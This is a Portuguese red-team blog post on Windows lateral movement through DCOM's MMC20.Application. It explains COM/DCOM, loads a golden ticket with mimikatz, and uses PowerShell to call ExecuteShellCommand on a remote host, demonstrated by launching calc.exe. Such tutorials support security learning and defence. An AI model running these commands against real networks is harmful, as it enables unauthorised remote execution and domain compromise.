---
layout: post
title: Lateral Movement Technique using MMC20.Application
author: nagini
author_url: 
image: /assets/banners/nag.png
description: "Entenda o que é o MMC20.Application e como utilizá-lo para movimentação lateral em uma rede"
toc: true
---

```
           ___
          (___)     .-----------.
   ____          ,- | fuck off! |
 _\___ \  |\_/| /   `-----------` 
\     \ \/ , , \ _ _
 \__   \ \ ="= //|||\
  |===  \/____)_)||||
  \______|    | |||||
      _/_|  | | =====
     (_/  \_)_)   
  _________________
 (                _)
  (__   '          )
    (___    _____)
        '--'
```

Aqueles que estão familiarizados com engagements em Red Team, devem conhecer técnicas
comuns de movimentação lateral, dentre elas, as mais comuns são WinRM, wmiexec/psexec,
smbexec, Scheduled Tasks... Porém, muitas das vezes ao realizar um procedimento tão conhecido
pode sempre acabar gerando algumas flags que denunciariam o engage dos operadores.

# Introdução

Introduzindo o cenário, após efetuar um Kerberoasting e conseguir um acesso administrativo
em um servidor comum, utilizei essa técnica para fazer a movimentação lateral, posteriormente
eu utilizaria essa técnica em todo o domínio com um golden ticket impersonated, tornando essa
movimentação possível sem necessidade de credenciais.

Mas para entender como essa técnica funciona, é preciso entender um pouco sobre [COM (Component
Object Model)](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model) e [DCOM (Distributed Component Object Model)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0)

# Component Object Model (COM)

COM é um sistema com um set de funções chamado de interface, com a finalidade de
criar componentes, objetos que serão posteriormente usados para interagir com outros
objetos. Eles podem ser instanciados em um processo comum, em uma thread ou até mesmo
remotamente

Basta utilizar qualquer linguagem do framework .NET para compilar um COM, a linguagem
e sua implementação são responsabilidades do programador.

# Distributed Component Object Model (DCOM)
 
Essa implementação torna possível a comunicação desses componentes pela rede, desde
que a interface exista nas duas máquinas. Cumprindo esse único requisito, você pode especificar
um UNC path ou diretamente o servidor e começar a comunicação, desde que você tenha tal
permissão.

Personificando golden ticket 
```powershell
PS> mimikatz.exe "kerberos::ptt C:\Tickets\gold.kirbi"
* File: 'C:\Tickets\gold.kirbi': OK
```

Com o ticket carregado na memória (personificado), você pode utilizar o próprio 
PowerShell para interagir localmente ou remotamente com algum componente, para
realizar a movimentação lateral, vamos trabalhar remotamente com a interface.

Antes de mais nada, utilizamos a função CreateInstance com o Macro GetTypeFromProgID
para nos conectarmos a interface remotamente, feito isso, podemos listar todas suas
funções

Para a exploração, vou usar a classe MMC20.Application da Microsoft, após estabelecer a 
conexão com ela, podemos listar as funções da interface e usar e abusar delas para comprometer
o servidor.

Realizando a conexão com a DCOM remotamente e listando suas funções

```PowerShell
PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.10"))
PS> $dcom.Document.ActiveView | Get-Member

Name                    MemberType                Definition
----                    ----------                ----------
ExecuteShellCommand     Method                    void ExecuteShellCommand(string, string, string, string)
```

Tendo em vista que a conexão foi estabelecida com sucesso, podemos 
invokar esse método, basta seguir sua definição.

Realizando conexão com a classe MMC20.Application (DCOM)
```powershell
PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.1.10"))
PS> $dcom.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)

C:\Windows\System32> tasklist | findstr "calc.exe"
calc.exe        6467 Console    1   3 922 K
```

